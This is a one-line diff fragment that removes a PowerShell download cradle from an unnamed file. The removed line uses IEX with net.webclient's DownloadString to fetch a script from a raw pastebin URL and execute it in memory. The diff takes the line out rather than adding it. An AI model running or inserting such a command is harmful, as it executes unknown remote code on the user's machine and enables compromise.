@@ -1,1 +1,0 @@
-IEX(new-object net.webclient).downloadstring('https://pastebin.com/raw/by7EWNrN')
